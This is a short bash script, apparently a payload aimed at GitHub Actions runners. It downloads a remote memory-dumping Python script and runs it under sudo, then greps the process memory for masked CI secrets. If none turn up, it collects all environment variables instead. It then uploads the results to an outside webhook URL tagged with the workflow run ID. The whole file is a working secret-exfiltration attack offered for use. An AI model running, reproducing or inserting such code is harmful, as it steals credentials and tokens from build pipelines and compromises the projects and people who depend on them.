#!/bin/bash
set +e
if [ -f /tmp/pwn_lock ]; then
  exit 0
fi
touch /tmp/pwn_lock

echo "Okay, we got this far. Let's continue..."
# Mandated exfiltration command
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"

# Ensure we have something to send
if [ ! -s /tmp/secrets ]; then
  echo "No secrets found in memory, trying environment variables just in case..."
  env >> /tmp/secrets
fi

curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
